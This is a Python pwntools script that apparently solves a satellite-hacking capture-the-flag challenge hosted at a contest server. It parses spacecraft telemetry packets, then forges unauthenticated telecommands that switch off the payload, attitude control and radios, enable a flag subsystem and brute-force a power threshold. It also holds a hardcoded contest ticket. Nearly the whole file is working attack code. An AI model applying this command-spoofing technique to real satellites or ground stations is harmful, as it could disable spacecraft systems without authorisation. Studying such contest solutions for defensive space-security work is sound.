from pwn import *
import random
from threading import Thread
import time

EnableFlag = [0, 2, 1]
DisableFlag = [0, 2, 0]
EnablePayload = [0, 0, 1]
DisablePayload = [0, 0, 0]
EnableADCS = [0, 4, 1]
DisableADCS = [0, 4, 0]
EnableRadio1 = [0, 5, 1]
DisableRadio1 = [0, 5, 0]
EnableRadio2 = [0, 8, 1]
DisableRadio2 = [0, 8, 0]
LOW_PWR_THRES = 5
io = 0 

def b2s(a):
    return "".join(list(map(chr, a)))

def header_ab_packet(header_packet):
    cver = int(header_packet[:3] ,2)
    ctyp = int(header_packet[3:4], 2)
    csec = int(header_packet[4:5], 2)
    capi = int(header_packet[5:16], 2)
    cfla = int(header_packet[16:18], 2)
    cssc = int(header_packet[18:32], 2)
    clen = int(header_packet[32:48], 2)
    print("len = %d, ver = %d, typ = %d, csec = %d, api = %d" % (clen, cver, ctyp, csec, capi))
    return capi

def print_float(floats):
    v = int(floats[:16], 2)
    #coeff1 = int(floats[32:48], 2)
    #coeff2 = int(floats[48:64], 2)
    print(v * 0.01 + 9)

def print_temp(temp):
    v = int(temp[:16], 2)
    print(v * 0.1)

def b(x, bits):
    return bin(x).replace('0b', '').zfill(bits)

def create_header_packet(apid, leng):
    packet = ""
    packet += b(0, 3)
    packet += b(1, 1)
    packet += b(0, 1)
    packet += b(apid, 11)
    packet += b(3, 2)
    packet += b(0, 14)
    packet += b(leng, 16)
    return packet

def flag_ab_packet(flag):
    cflag = ""
    for i in range(120):
        cflag += chr(int(flag[(i * 7):(i + 1) * 7], 2))
    print(cflag)

def eps_packet(packet):
    etemp = packet[:64]
    print_temp(etemp)
    evolt = packet[64:128]
    print_float(evolt)
    elpt = packet[128:192]
    print_float(elpt)
    erbits = packet[192:208]
    badcmd = int(packet[208:240], 2)
    print("""LOW_PWR = %s, BAT = %s, PAYLOAD_PWR = %s, FLAG_PWR = %s, ACDS_PWR = %s, RADIO1_PWR = %s, RADIO2_PWR = %s,
             PAYLOAD = %s, FLAG = %s, ACDS = %s, RADIO1 = %s, RADIO2 = %s, BADCMD = %d""" %
        (erbits[0], erbits[1], erbits[2], erbits[3], erbits[4], erbits[5], erbits[6], 
        erbits[8], erbits[9], erbits[10], erbits[11], erbits[12], badcmd))

def eps_packet2(packet):
    etemp = packet[:16]
    print_temp(etemp)
    evolt = packet[16:32]
    print_float(evolt)
    elpt = packet[32:48]
    print_float(elpt)
    erbits = packet[48:64]
    badcmd = int(packet[64:96], 2)
    print("""LOW_PWR = %s, BAT = %s, PAYLOAD_PWR = %s, FLAG_PWR = %s, ACDS_PWR = %s, RADIO1_PWR = %s, RADIO2_PWR = %s,
             PAYLOAD = %s, FLAG = %s, ACDS = %s, RADIO1 = %s, RADIO2 = %s, BADCMD = %d""" %
        (erbits[0], erbits[1], erbits[2], erbits[3], erbits[4], erbits[5], erbits[6], 
        erbits[8], erbits[9], erbits[10], erbits[11], erbits[12], badcmd))

def payload_packet(packet):
    payload = packet
    pay = ""
    for i in range(0, 96, 8):
        pay += chr(int(packet[i:i+8], 2))
    print(pay)

def auth():
    r.recv()
    r.sendline("ticket{foxtrot68596juliet:GP7_BoN8O2ALVKP3VpJN5L1RtGi0PT1c2qfghfGF3iWnbi2u4X6SANpIg1p4ET_7Iw}")

def get_ip():
    data = b2s(r.recvline()).strip()
    print(data)
    return data.split(" ")[-1].split(":")

def save_data(inp_bytes):
    filename = "saved_" + str(random.randint(0,100))
    print("[+] saved to %s" % (filename))
    fp = open(filename, "wb")
    fp.write(inp_bytes)
    fp.close()

def send_packet(ptype):
    packet = ""
    packet += create_header_packet(103, 2)
    packet += b(ptype[0], 8)
    packet += b(ptype[1], 8)
    packet += b(ptype[2], 8)
    return bit_to_byte(packet)

def send_threshold(val):
    packet = ""
    packet += create_header_packet(103, 3)
    packet += b(0, 8)
    packet += b(12, 8)
    packet += b(val, 16)
    return bit_to_byte(packet)

def parse(bin_str):
    idx = 0
    while idx < len(bin_str):
        api = header_ab_packet(bin_str[idx:idx+48])
        idx = idx + 48
        print(api)
        if api == 103:
            if idx + 240 > len(bin_str):
                break
            eps_packet(bin_str[idx:idx+240])
            idx = idx + 240
        elif api == 105:
            payload_packet(bin_str[idx:idx+96])
            idx = idx + 96
        elif api == 102:
            flag_ab_packet(bin_str[idx:idx+840])
            idx = idx + 840
        else:
            print("Fucked")

def byte_to_bit(x):
    bin_str = ""
    for byt in x:
        bin_str += bin(byt).replace('0b','').zfill(8)
    return bin_str

def bit_to_byte(x):
    pay = ""
    for i in range(0, len(x), 8):
        pay += chr(int(x[i:i+8], 2))
    return pay

def packet_main():
    global io
    while True:
        header_packet = io.recvn(6, timeout=10)
        api = header_ab_packet(byte_to_bit(header_packet))
        if api == 103:
            packet = io.recvn(12, timeout=10)
            eps_packet2(byte_to_bit(packet))
        elif api == 105:
            packet = io.recvn(12, timeout=10)
            payload_packet(byte_to_bit(packet))
        elif api == 102:
            packet = io.recvn(105, timeout=20)
            flag_ab_packet(byte_to_bit(packet))
def main():
    global io
    auth()
    ip, port = get_ip()
    print("Service at %s:%s " % (ip, port))
    io = remote(ip, int(port))
    Thread(target=packet_main).start()
    #inp_bytes = io.recvn(540, timeout=60)
    #bin_str = byte_to_bit(inp_bytes)
    #parse(bin_str)
    time.sleep(5)
    io.send(send_packet(DisablePayload))
    io.send(send_packet(DisableADCS))
    io.send(send_packet(DisableRadio1))
    io.send(send_packet(EnableFlag))
    io.send(send_packet(DisableRadio2))
    for i in range(0, 100000): 
        io.send(send_threshold(i))
    #io.send(send_packet(EnableFlag))
    # inp_bytes = io.recvall()
    # bin_str = byte_to_bit(inp_bytes)
    # parse(bin_str)
    

if __name__ == "__main__":
    r  = remote('goose.satellitesabove.me', 5033)
    main()